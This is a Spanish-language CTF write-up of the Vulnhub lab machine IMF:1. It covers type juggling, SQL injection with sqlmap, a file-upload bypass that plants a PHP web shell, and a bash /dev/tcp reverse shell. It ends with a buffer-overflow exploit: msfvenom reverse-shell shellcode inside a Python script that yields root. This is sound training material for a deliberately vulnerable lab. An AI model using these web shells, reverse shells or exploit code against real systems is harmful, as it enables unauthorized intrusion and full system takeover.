---
layout: single
title: IMF:1 - Vulnhub
excerpt: "Máquina linux de dificultad MEDIUM de la plataforma Vulnhub. Se tratan temas de Type Juggling, SQLI, FileUpload y Buffer Overflow"
date: 2024-07-28
classes: wide
header:
  teaser: /assets/images/vh-writeup-imf/imf_logo.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.png
categories:
  - Vulnhub
tags:
  - type juggling 
  - sqli
  - file upload
  - buffer overflow
  - medium
  - linux
---

<img src="/assets/images/vh-writeup-imf/imf_logo.png" width="500" align="center"/>

IMF es una máquina de linux de nivel medio. Tiene un comienzo estilo CTF en el cuál hay que salir fuera de la caja a la hora de pensar, aunque el resto es más realista. Tiene varios stages siendo una máquina larga, sin embargo, se intentarán tratar de forma detallada.

## Índice
* [Fase de reconocimiento](#reconocimiento)
  * [Reconociento de puertos y servicios](#reconocimiento)
  * [Reconocimiento de la página web](#reconocimiento-web)
  * [Fuzzing de la web](#fuzzing)
* [Login](#login)
* [CMS]
* [Intelligence Upload Form](#file-upload)
* [Escalada de pivilegios](#escalada)
  * [Buffer Overflow](#bof)

<a id="reconocimiento"></a>
## Fase de reconocimiento

### Reconocimiento de puertos y servicios


Empezaremos utilizando `nmap` para descubrir los puertos abiertos accesibles(digo accesibles ya que la máquina puede tener más puertos abiertos pero que solo son accesibles desde la misma).
```bash
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -v 192.168.18.54
Nmap scan report for 192.168.18.54
  Host is up (0.00045s latency).
  Not shown: 65534 filtered tcp ports (no-response)
  Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
  PORT   STATE SERVICE
    80/tcp open  http
  MAC Address: 08:00:27:A4:D2:C6 (Oracle VirtualBox virtual NIC)
```

En este caso solo tiene expuesto el puerto 80, así que escanemos ese puerto para ver el servicio y su versión con `nmap`.

```bash
nmap -sC -sV -p80 -oN targeted 192.168.18.54
PORT   STATE SERVICE VERSION
   │ 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
   │ |_http-title: IMF - Homepage
   │ |_http-server-header: Apache/2.4.18 (Ubuntu)
   │ MAC Address: 08:00:27:A4:D2:C6 (Oracle VirtualBox virtual NIC)

```

Las versiones en este caso no son vulnerables.

<a id="reconocimiento-web"></a>
### Reconocimiento de la página web

Una vez, escaneado los puertos procedemos a enumerar el servicio `http`.

![](/assets/images/vh-writeup-imf/home.png)

Tras investigar por las diferentes páginas a las que podemos acceder y mirar su código `HTML` nos damos cuenta de lo siguiente:

![](/assets/images/vh-writeup-imf/flag1_contact_php.png)

En la página `contact.php` podemos ver la primera flag: `flag1{YWxsdGhlZmlsZXM=}`

Si vemos que pone en el mensaje den base64: `allthefiles`

Esto nos da una pista un poco rebuscada de en lo que debemos fijarnos. Si procedemos a fuzzear la página web en busca de otras rutas que no vemos no descubriremos mucho. El truco aquí está en fijarnos bien en los archivos que se importan en la página web.

En el código `html` de la página inicial vemos los siguientes archivos `.js`:

![](/assets/images/vh-writeup-imf/base64-Flag2.png)

El último archivo parece ser base64 ya que tiene `==` al final, pero los 3 son base64. No basta con traducirlos por separados, sino como decía la pista `allthefiles`, hay que juntar las 3 cadenas en orden y entonces, traducir el base64.

![](/assets/images/vh-writeup-imf/flag2.png)

Flag: `flag2{aW1mYWRtaW5pc3RyYXRvcg==}`

Vemos una nueva pista: `imfadministrator`

> A partir de aquí usaré el dominio imf.local para referirme a la máquina

Si probamos esta cadena como un directorio, encontraremos una nueva parte de la página web que hasta el momento estaba oculta: `http://imf.local/imfadministrator`

![](/assets/images/vh-writeup-imf/login.png)

<a id="login"></a>
## Login

Si probamos los usuarios que encontramos en la página `contact.php`, nos daremos cuenta de que `rmichaels` lo detecta como un usuario existente.

Si miramos una vez más el código fuente veremos otra pista:

```html
<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
```

Esto, junto a que sabemos que la página está construida con `php`, nos hace pensar que el código se verá de la siguiente forma:

```php
$username = $_POST['username']
$pass = $_POST['pass']

if($username == 'rmichaels'){
  if($pass == '******') {
    // Garantizar el acceso al usuario
  }
}
```
> La contraseña no tiene por qué ser esa.

Lo importante de este código reside en la comparativa. Si es cierto que en el código original se ha empleado el `==` en vez de `===` significa que el código es vulnerable a un **Type Juggling**.

El **Type Juggling** consiste en que al comparar dos variables de diferente tipo (integer, string, array, etc.) puede llevar a confusión. Por ejemplo, si comparamos un string cualquiera con un array, el valor resultante siempre será `true`:

```php
'hello world' == [] // true
```

Si interceptamos la petición de login y modificamos el valor de password para que `php` lo interprete como un array ocurrirá lo siguiente:

![](/assets/images/vh-writeup-imf/flag3.png)

Obtendremos acceso y la flag3: `flag3{Y29udGludWVUT2Ntcw==}`

El base64 dice: `continueTOcms`

Así que, tal y como dice la pista, iremos al apartado cms clickeando en el enlace.

<a id="cms"></a>
## CMS

![](/assets/images/vh-writeup-imf/cms.png)

Si clickeamos en los diferentes links, nos datmos cuenta de que hay un parámetro `pagename` el cual se encarga de hacer que cambie la página. Si insertamos un `'` al final del valor, nos daremos cuenta de que es vulnerable a un **SQL Injection**:

![](/assets/images/vh-writeup-imf/sqli.png)

> El %27 es el carácter `'` en url-encoding

Si guardamos la request sin el `'` con burpsuite y usamos `sqlmap.py` podremos dumpear la base de datos.

> Para guardar una request de BurpSuite: Click derecho en la request -> Copy to file

1. Primero vemos las bases de datos:

```bash
sqlmap -r req.req -p pagename --dbs --risk=3 --level=5
```

> El archivo req.req es mi request

Y vemos que hay una base de datos llamada `admin` así que la usaremos para ver que tablas tiene.

2. Ver las tablas de la base de datos `admin`:

```bash
sqlmap -r req.req -p pagename -D admin --tables --risk=3 --level=5
```

Vemos una tabla llamada pages.

3. Vemos que columnas tiene:

```bash
sqlmap -r req.req -p pagename -D admin -T pages --columns --risk=3 --level=5
```

Vemos que tiene dos columnas: `pagedata` y `pagename`. Este último tiene el mismo nombre del parámetro por el cual estamos inyectando *SQL*. 

4. Dumpeamos los pagenames para ver si hay alguno oculto:

```bash
sqlmap -r req.req -p pagename -D admin -T pages -C pagename --dump --columns --risk=3 --level=5
```

Nos damos cuenta de que efectivamente hay un pagename oculto: `tutorials-incomplete`.

Si entramos en `http://imf.local/imfadministrator/cms.php?pagename=tutorials-incomplete` podemos ver una imagen con un QR.

![](/assets/images/vh-writeup-imf/flag4.png)

Si escaneamos este QR podemos ver la flag4: `flag4{dXBsb2Fkcjk0Mi5waHA=}`

El base64 se decodifica como: `uploadr942.php`

<a id="file-upload"></a>
## Intelligence Upload Form

Si accedemos a `http://imf.local/imfadministrator/uploadr942.php` podremos ver lo siguiente:

![](/assets/images/vh-writeup-imf/upload%20form.png)

Como el backend es `php` podemos intentar subir un código que nos permita ejecutar comandos:

```php
<?php echo system($_GET['cmd']); ?>
```

Esto nos permite ejecutar comandos con un parámetro `cmd`.

Si intentamos subir este archivo `php` nos dirá que no se permiten este tipo de archivos. Para que nos permita subir este archivo, tenemos que interceptar la petición y cambiar lo siguiente:

- El Content-Type a algo como `image/gif` en mi caso.
- La extensión a `.gif`
- Y el comienzo del archivo a `GIF8;`
- Cambiar el `system` del script ya que lo detecta como malicioso. Para ello envuelve el `$_GET['cmd']` con \`\`.

En mi caso lo hago con `.gif` ya que a la hora de referenciar este archivo podremos ver el resultado de los comandos.

Este es el resultado:

![](/assets/images/vh-writeup-imf/file%20upload.png)

Como se puede ver, nos da un hash en la respuesta. Este será el nombre del archivo con el que se guardará. Si fuzzeamos en `imfadministrator` podremos encontrar la carpeta `uploads`.

Si accedemos a `http://imf.local/imfadministrator/uploads/<hash>.gif?cmd=whoami` podremos ver lo siguiente:

![](/assets/images/vh-writeup-imf/rce.png)

Por lo tanto tenemos ejecución remota de comandos y podemos intentar a entablar una `Reverse Shell` con la máquina víctima.

El payload que usaré para ello será el siguiente

- Comando a ejecutar en la máquina víctima:
```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/[ip]/[port] 0>&1' 
```
> [ip] corresponde con nuestra ip y [port] con el puerto que elijamos para ponernos en escucha

- Comando a ejecutar en la máquina atacante:
```bash
nc -nlvp [port]
```
> [port] corresponde con el puerto que elijamos para ponernos en escucha

> Primero hay que ponerse en escucha antes de enviar la reverse shell

Lo que estamos haciendo con estos comandos es ponernos en escucha en un puerto en la máquina del atacante y conectándonos por ese puerto en la máquina víctima y enviándonos una shell.

Si ponemos el comando de la víctima en nuestro parámetro `cmd` y lo url-encodeamos quedaría de la siguiente manera:

![](/assets/images/vh-writeup-imf/reverse-shell.png)

En el directorio donde aparecemos hay un archivo donde se encuentra la flag:

![](/assets/images/vh-writeup-imf/flag5.png)

Flag: `flag5{YWdlbnRzZXJ2aWNlcw==}` -> `agentservices`

Esta será la pista para la escalada de privilegios.

<a id="escalada"></a>
### Escalada de privilegios

Si seguimos la pista anterior y buscamos por archivos de con nombre `agent` podremos encontrar lo siguiente:

```bash
find / -name agent 2>/dev/null
/usr/local/bin/agent
/etc/xinetd.d/agent
```

Hay un binario llamado agent, pero no cuenta con permisos SUID o de algo que nos sirva de utilidad. Como la pista decía que era un servicio así que miramos que puertos están abiertos internamente:

```bash
netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:7788            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0    136 192.168.18.54:54428     192.168.18.43:443       ESTABLISHED
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       1      0 192.168.18.54:80        192.168.18.43:46604     CLOSE_WAIT
```

Podemos ver un puerto `7788` que no es uno usado usualmente. El `3306` es el servidor `sql` y el `22` es ssh. Si nos conectamos a este puerto con `telnet` podemos ver lo siguiente:

```bash
telnet 0.0.0.0 7788
Trying 0.0.0.0...
Connected to 0.0.0.0.
Escape character is '^]'.
  ___ __  __ ___ 
 |_ _|  \/  | __|  Agent
  | || |\/| | _|   Reporting
 |___|_|  |_|_|    System


Agent ID : 
```

Es el mismo panel del `/usr/local/bin/agent`:

```bash
/usr/local/bin/agent
  ___ __  __ ___ 
 |_ _|  \/  | __|  Agent
  | || |\/| | _|   Reporting
 |___|_|  |_|_|    System


Agent ID : 
```

Podemos ver qué usuario está ejecutando este servicio podemos ver el contenido del otro archivo que encontramos al buscar por agent: `/etc/xinetd.d/agent`

```bash
cat /etc/xinetd.d/agent
# default: on
# description: The agent server serves agent sessions
# unencrypted agentid for authentication.
service agent
{
       flags          = REUSE
       socket_type    = stream
       wait           = no
       user           = root
       server         = /usr/local/bin/agent
       log_on_failure += USERID
       disable        = no
       port           = 7788
}
```

Aquí podemos observar que efectivamente el puerto `7788` ejecuta el binario que vimos y en el apartado `user` vemos que lo ejecuta `root`. Si tenemos alguna forma de aprovecharnos de este binario y ejecutar una shell estaremos como el usuario `root`.

Para analizarlo mejor, nos lo traemos a nuestra máquina de atacante. Yo lo hago de la siguiente forma:

- En la máquina víctima:
```bash
nc -n <mi ip> <un puerto mío> < /usr/local/bin/agent
```

- En mi máquina:
```bash
nc -nvlp <el mismo puerto mío> > agent
```

> Primero hay que ponerse en escucha en tu máquina antes de enviar el archivo

- Comprobar la integridad del archivo:
```
md5sum agent
```

> Se compara el hash en las dos máquinas para ver si coincide

### Análisis del binario

Para el análisis del binario usaré [Ghidra]("https://ghidra-sre.org/") que debería de estar preinstalado en distribuciones como **Kali linux** y **Parrot OS**.

Una vez abierto el programa, creamos un nuevo proyecto y arrastramos el binario dentro de la carpeta. Una vez aceptamos las ventanas que nos aparecen, arrastramos el binario al icono del dragón y le pedimos que nos analice el binario cuando nos lo pregunte.

En la parte izquierda se encuentran todas las funciones y le damos click a main:

![](/assets/images/vh-writeup-imf/click_menu.png)

Ahora podemos ver la función main del programa:

![](/assets/images/vh-writeup-imf/main.png)

Podemos ver el menú de inicio que se printea, así que es señal de que estamos en el sitio correcto. 
Si ejecutamos el binario podemos ver que nos pide un ID como login. Este ID se puede ver representado en el código:

![](/assets/images/vh-writeup-imf/id.png)

Primero se introduce en una función un número hexadecimal y luego compara la variable que coge nuestro input con esta cadena. Como se puede observar en la función `asprintf`, tiene un parámetro `%i` que indica que transforma el hexadecimal en número y luego lo guarda como string. Si hacemos click derecho en este valor podemos verlo como decimal:

![](/assets/images/vh-writeup-imf/contraseña_agent.png)

Si ejecutamos el binario y usamos este número como ID podemos ver que avanzamos en el programa a un menú con diferentes funciones.

En Ghidra, podemos acceder a estas funciones desde el mismo panel del cual abrimos la función main. La función que nos interesa analizar es `report`. Lo interesante de esta función respecto a las demás es el uso de la función `get`. Esta función es un problema de seguridad en `c` ya que no controla el límite de la longitud de caracteres que intentas meter en el búffer definido anteriormente:

![](/assets/images/vh-writeup-imf/bof_ghidra.png)

En este caso podemos ver que el tamaño del búffer es de `164`. Si al ejecutar el script nos metemos en el apartado de `report` y como reporte metemos 200 caracteres podemos ver que nos da un `Segmentation Fault`, y por lo tanto es vulnerable a un **Búffer Overflow**.

### Búffer Overflow

#### Qué es un Búffer Overflow

Como se ha dicho anteriormente, el **Búffer Overflow** ocurre cuando sobre pasas un búffer con una longitud limitado. Esto es crítico ya que al hacer esto, sobreescribes otras partes de la memoria pudiendo afectar a otros registros. 

En el tipo de **Búffer Overflow** más simple, sobreescribimos el registro `EIP`. Este registro se encarga de guardar la siguiente "línea de código" que se va a ejecutar para redirigirlo a un código nuestro llamada `shellcode` y ejecutar comandos maliciosos como entablar una `Reverse shell` en nuestro caso.

Nuestro plan será el siguiente:

1. Ver cuantos caracteres son necesarios para sobreescribir el registro `EIP`
2. Hallar un sitio para almacenar el `shellcode`
3. Hallar en el binario una "línea de código" la cual apunte a nuestro `shellcode`. A esto lo llamaremos `OpCode`
4. Hacer que el `EIP` apunte al `Opcode` y meter nuestro `shellcode`

#### Explotación

Para explotar el **Búffer Overflow** usaré el comando `gdb` junto con [peda](https://github.com/longld/peda). 

##### Sobreescribiendo el EIP

Primero de todo, vamos a ver cuantos caracteres son necesarios para sobreescribir el `EIP`:

1. Primero ejecuto el gdb:

```bash
gdb agent -q
```

2. Ejecuto `pattern create 200` y copio el valor
3. Luego corro el programa insertando `r`
4. Uso el ID mencionado anteriormente y entro en el apartado de `report`
5. Inserto el patrón creado
6. Ejecuto `pattern offset $eip` para ver cuantos caracteres tengo que insertar para sobreescribir el registro EIP y me da un valor de `168`.

![](/assets/images/vh-writeup-imf/gdb_eip_necesario.png)

Si ahora ejecutamos el programa e insertamos en el reporte el caracter `A` 168 veces y luego 4 `B`, podemos ver que se sobreescribe el EIP con `42424242`. Por lo tanto es correcto.

> 42 es B en ASCII

##### Buscando un lugar para el shellcode

Si miramos la región a donde apunta el registro `eax` con `x/16wx $eax` podemos ver que las `A` empiezan a aprecer por ahí. Por lo tanto nuestro payload tendrá la siguiente estructura:

```py
payload = shellcode + b"A" * (offset - len(shellcode)) + call_eax
```

Es decir, primero vendrá nuestro shellcode, luego se rellenará de `A` hasta llegar justo antes del EIP y luego el EIP se rellenará con una dirección que contenga la instrucción `call eax` para que se ejecute el shellcode que metimos anteriormente.

##### Buscando el OpCode

Para encontrar la llamada de `call eax` en el binario primero tenemos que saber su representación en hexadecimal:

```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > call eax
00000000  FFD0              call eax
```

Ahora que lo sabemos lo buscamos con el siguiente comando:

```bash
objdump -d agent | grep -i "FF D0"
8048563:	ff d0                	call   *%eax
```

Y vemos que se encuentra en 0x08048563. Esta dirección será a la que refenciaremos en el EIP.

##### Generando el shellcode

Para genera el shellcode usé este comando:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -b '\x00\x0a\x0d' -f c
```

> En -b quité los BadChars que son más comunes

##### Generando el exploit

Sólo queda crear un script que se conecte al puerto interno `7788`, ponga el ID, elija la opción 3 e inserte el payload que acabamos de generar:

```py
from struct import pack
import socket

# Insertar tu payload
shellcode =(b"\xdb\xd9\xbe\x39\x9b\xff\x1e\xd9\x74\x24\xf4\x5d\x29\xc9"
b"\xb1\x12\x31\x75\x17\x83\xc5\x04\x03\x4c\x88\x1d\xeb\x9f"
b"\x75\x16\xf7\x8c\xca\x8a\x92\x30\x44\xcd\xd3\x52\x9b\x8e"
b"\x87\xc3\x93\xb0\x6a\x73\x9a\xb7\x8d\x1b\xdd\xe0\x7c\xf0"
b"\xb5\xf2\x80\x02\x94\x7a\x61\xba\x7e\x2d\x33\xe9\xcd\xce"
b"\x3a\xec\xff\x51\x6e\x86\x91\x7e\xfc\x3e\x06\xae\x2d\xdc"
b"\xbf\x39\xd2\x72\x13\xb3\xf4\xc2\x98\x0e\x76")

offset = 168

# La dirección de "call eax" tiene que estar en Little Endian
payload = shellcode + b"A" * (offset - len(shellcode)) + pack("<L", 0x08048563) + b"\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 7788))

# Recibimos el banner
s.recv(1024)

# Enviamos el ID
id = b"48093572\n"
s.send(id)

# Recibimos: Login Validated
s.recv(1024)

# Recibimos el menú
s.recv(1024)

# Eligimos report
s.send(b"3\n")

# Recibimos el menú de report
s.recv(1024)

# Enviamos el payload
s.send(payload)
```

Nos ponemos en escucha en la máquina del atacante por el puerto especificado en el shellcode y ejecutamos el script en la máquina víctima ganando acceso como root.

En la carpeta `/root` podemos encontrar la flag final:

![](/assets/images/vh-writeup-imf/final.png)
